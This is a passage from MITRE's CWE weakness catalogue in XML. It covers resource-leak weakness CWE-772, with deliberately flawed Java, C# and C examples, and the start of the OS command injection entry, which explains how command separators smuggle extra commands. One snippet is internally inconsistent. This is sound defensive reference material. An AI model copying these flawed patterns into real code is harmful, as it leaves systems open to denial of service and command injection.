               <CAPEC_ID>121</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>125</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>130</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>147</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>197</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>229</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>230</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>231</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>469</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>82</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>99</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2009-05-13</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples,
						Detection_Factors, Observed_Examples, References,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References,
						Related_Attack_Patterns, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="772" Name="Missing Release of Resource after Effective Lifetime" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software does not release a resource after its effective
					lifetime has ended, i.e., after the resource is no longer
					needed.</Description_Summary>
            <Extended_Description>
               <Text>When a resource is not released after use, it can allow attackers to cause
						a denial of service.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>404</Relationship_Target_ID>
               <!--Improper Resource Shutdown or Release--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>400</Relationship_Target_ID>
               <!--Uncontrolled Resource Consumption ('Resource Exhaustion')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>882</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 14 - Concurrency (CON)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>982</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Failure to Release Resource--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Mobile Application"/>
            </Architectural_Paradigms>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>"Resource exhaustion" (CWE-400) is currently treated as a weakness,
						although it is more like a category of weaknesses that all have the same
						type of consequence. While this entry treats CWE-400 as a parent in view
						1000, the relationship is probably more appropriately described as a
						chain.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: resource consumption
						(other)</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When allocating resources without limits, an attacker could prevent
							all other processes from accessing the same type of resource.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>For example, languages such as Java, Ruby, and Lisp perform automatic
							garbage collection that releases memory for objects that have been
							deallocated.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>It is good practice to be responsible for freeing all resources you
							allocate and to be consistent with how and where you free resources in a
							function. If you allocate resources that you intend to free upon
							completion of the function, you must be sure to free the resources at
							all exit points for that function including error conditions.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-47">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Limit Resource Consumption</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use resource-limiting settings provided by the operating system or
							environment. For example, when managing system resources in POSIX,
							setrlimit() can be used to set limits for certain types of resources,
							and getrlimit() can determine how many resources are available. However,
							these functions are not available on all operating systems. </Text>
                  <Text>When the current levels get close to the maximum that is defined for
							the application (see CWE-770), then limit the allocation of further
							resources to privileged users; alternately, begin releasing resources
							for less-privileged users. While this mitigation may protect the system
							from attack, it will not necessarily stop attackers from adversely
							impacting other users. </Text>
                  <Text>Ensure that the application performs the appropriate error checks and
							error handling in case resources become unavailable (CWE-703). </Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to process a file by reading it in line
						by line until the end has been reached.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private void processFile(string fName)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>BufferReader in = new BufferReader(new
									FileReader(fName));</Code>
                        <Code>String line;</Code>
                        <Code>while ((line = in.ReadLine()) != null)</Code>
                        <Code>{</Code>
                        <Block>
                           <Code>processLine(line);</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The problem with the above code is that it never closes the file
							handle it opens. The Finalize() method for BufferReader eventually calls
							Close(), but there is no guarantee as to how long it will take before
							the Finalize() method is invoked. In fact, there is no guarantee that
							Finalize() will ever be invoked. In a busy environment, this can result
							in the VM using up all of its available file handles. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to open a new connection to a database,
						process the results returned by the database, and close the allocated
						SqlConnection object.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>SqlConnection conn = new SqlConnection(connString);</Code>
                     <Code>SqlCommand cmd = new SqlCommand(queryString);</Code>
                     <Code>cmd.Connection = conn;</Code>
                     <Code>conn.Open();</Code>
                     <Code>SqlDataReader rdr = cmd.ExecuteReader();</Code>
                     <Code>HarvestResults(rdr);</Code>
                     <Code>conn.Connection.Close();</Code>
                  </Block>
                  <Text>The problem with the above code is that if an exception occurs while
							executing the SQL or processing the results, the SqlConnection object is
							not closed. If this happens often enough, the database will run out of
							available cursors and not be able to execute any more SQL queries.
						</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-81">
               <Intro_Text>The following method never closes the file handle it opens. The
						Finalize() method for StreamReader eventually calls Close(), but there is no
						guarantee as to how long it will take before the Finalize() method is
						invoked. In fact, there is no guarantee that Finalize() will ever be
						invoked. In a busy environment, this can result in the VM using up all of
						its available file handles.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private void processFile(string fName) {</Code>
                     <Block>
                        <Code>StreamWriter sw = new StreamWriter(fName);</Code>
                        <Code>string line;</Code>
                        <Code>while ((line = sr.ReadLine()) != null){</Code>
                        <Block>
                           <Code>processLine(line);</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-82">
               <Intro_Text>This code attempts to open a connection to a database and catches
						any exceptions that may occur.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>try {</Code>
                     <Block>
                        <Code>Connection con =
									DriverManager.getConnection(some_connection_string);</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>catch ( Exception e ) {</Code>
                     <Block>
                        <Code>log( e );</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If an exception occurs after establishing the database connection and
							before the same connection closes, the pool of database connections may
							become exhausted. If the number of available connections is exceeded,
							other users cannot access this resource, effectively denying access to
							the application. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-83">
               <Intro_Text>Under normal conditions the following C# code executes a database
						query, processes the results returned by the database, and closes the
						allocated SqlConnection object. But if an exception occurs while executing
						the SQL or processing the results, the SqlConnection object is not closed.
						If this happens often enough, the database will run out of available cursors
						and not be able to execute any more SQL queries.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>...</Code>
                     <Code>SqlConnection conn = new SqlConnection(connString);</Code>
                     <Code>SqlCommand cmd = new SqlCommand(queryString);</Code>
                     <Code>cmd.Connection = conn;</Code>
                     <Code>conn.Open();</Code>
                     <Code>SqlDataReader rdr = cmd.ExecuteReader();</Code>
                     <Code>HarvestResults(rdr);</Code>
                     <Code>conn.Connection.Close();</Code>
                     <Code>...</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-84">
               <Intro_Text>The following C function does not close the file handle it opens if
						an error occurs. If the process is long-lived, the process can run out of
						file handles.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int decodeFile(char* fName) {</Code>
                     <Block>
                        <Code>char buf[BUF_SZ];</Code>
                        <Code>FILE* f = fopen(fName, "r");</Code>
                        <Code>if (!f) {</Code>
                        <Block>
                           <Code>printf("cannot open %s\n", fName);</Code>
                           <Code>return DECODE_FAIL;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>while (fgets(buf, BUF_SZ, f)) {</Code>
                           <Block>
                              <Code>if (!checkChecksum(buf)) {</Code>
                              <Block>
                                 <Code>return DECODE_FAIL;</Code>
                              </Block>
                              <Code>}</Code>
                              <Code>else {</Code>
                              <Block>
                                 <Code>decodeBlock(buf);</Code>
                              </Block>
                              <Code>}</Code>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>fclose(f);</Code>
                        <Code>return DECODE_SUCCESS;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-0897</Observed_Example_Reference>
               <Observed_Example_Description> Chain: anti-virus product encounters a malformed
						file but returns from a function without closing a file descriptor (CWE-775)
						leading to file descriptor consumption (CWE-400) and failed scans.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0830</Observed_Example_Reference>
               <Observed_Example_Description>Sockets not properly closed when attacker
						repeatedly connects and disconnects from
						server.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-1999-1127</Observed_Example_Reference>
               <Observed_Example_Description>Does not shut down named pipe connections if
						malformed data is sent.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2858</Observed_Example_Reference>
               <Observed_Example_Description> Chain: memory leak (CWE-404) leads to resource
						exhaustion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2054</Observed_Example_Reference>
               <Observed_Example_Description> Product allows exhaustion of file descriptors
						when processing a large number of TCP
						packets.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2122</Observed_Example_Reference>
               <Observed_Example_Description>Port scan triggers CPU consumption with processes
						that attempt to read data from closed
						sockets.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4103</Observed_Example_Reference>
               <Observed_Example_Description>Product allows resource exhaustion via a large
						number of calls that do not complete a 3-way
						handshake.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1372</Observed_Example_Reference>
               <Observed_Example_Description> Return values of file/socket operations not
						checked, allowing resultant consumption of file
						descriptors.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Theoretical_Notes>
            <Theoretical_Note>
               <Text>Vulnerability theory is largely about how behaviors and resources
						interact. "Resource exhaustion" can be regarded as either a consequence or
						an attack, depending on the perspective. This entry is an attempt to reflect
						one of the underlying weaknesses that enable these attacks (or consequences)
						to take place.</Text>
            </Theoretical_Note>
         </Theoretical_Notes>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Use lock classes for mutex management</Mapped_Node_Name>
               <Mapped_Node_ID>CON02-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Failure to release resource</Mapped_Node_Name>
               <Mapped_Node_ID>SFP14</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>469</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2009-05-13</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms,
						Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software constructs all or part of an OS command using
					externally-influenced input from an upstream component, but it does not
					neutralize or incorrectly neutralizes special elements that could modify the
					intended OS command when it is sent to a downstream
					component.</Description_Summary>
            <Extended_Description>
               <Text>This could allow attackers to execute unexpected, dangerous commands
						directly on the operating system. This weakness can lead to a vulnerability
						in environments in which the attacker does not have direct access to the
						operating system, such as in web applications. Alternately, if the weakness
						occurs in a privileged program, it could allow the attacker to specify
						commands that normally would not be accessible, or to call alternate
						commands with privileges that the attacker does not have. The problem is
						exacerbated if the compromised process does not follow the principle of
						least privilege, because the attacker-controlled commands may run with
						special system privileges that increases the amount of damage.</Text>
               <Text>There are at least two subtypes of OS command injection:</Text>
               <Block Block_Nature="Numeric_List">
                  <Text>The application intends to execute a single, fixed program that is
							under its own control. It intends to use externally-supplied inputs as
							arguments to that program. For example, the program might use
							system("nslookup [HOSTNAME]") to run nslookup and allow the user to
							supply a HOSTNAME, which is used as an argument. Attackers cannot
							prevent nslookup from executing. However, if the program does not remove
							command separators from the HOSTNAME argument, attackers could place the
							separators into the arguments, which allows them to execute their own
							program after nslookup has finished executing.</Text>
                  <Text>The application accepts an input that it uses to fully select which
							program to run, as well as which commands to use. The application simply
							redirects this entire command to the operating system. For example, the
							program might use "exec([COMMAND])" to execute the [COMMAND] that was
							supplied by the user. If the COMMAND is under attacker control, then the
							attacker can execute arbitrary commands or programs. If the command is
							being executed using functions like exec() and CreateProcess(), the
							attacker might not be able to combine multiple commands together in the
							same line.</Text>
               </Block>
               <Text>From a weakness standpoint, these variants represent distinct programmer
						errors. In the first variant, the programmer clearly intends that input from
						untrusted parties will be part of the arguments in the command to be
						executed. In the second variant, the programmer does not intend for the
						command to be accessible to any untrusted party, but the programmer probably
						has not accounted for alternate ways in which malicious attackers can
						provide input.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>77</Relationship_Target_ID>
               <!--Improper Neutralization of Special Elements used in a Command ('Command Injection')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanAlsoBe</Relationship_Nature>
               <Relationship_Target_ID>88</Relationship_Target_ID>
               <!--Argument Injection or Modification--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>634</Relationship_Target_ID>
               <!--Weaknesses that Affect System Processes--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>714</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A3 - Malicious File Execution--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>727</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A6 - Injection Flaws--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>741</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 07 - Characters and Strings (STR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>744</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 10 - Environment (ENV)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>810</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A1 - Injection--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
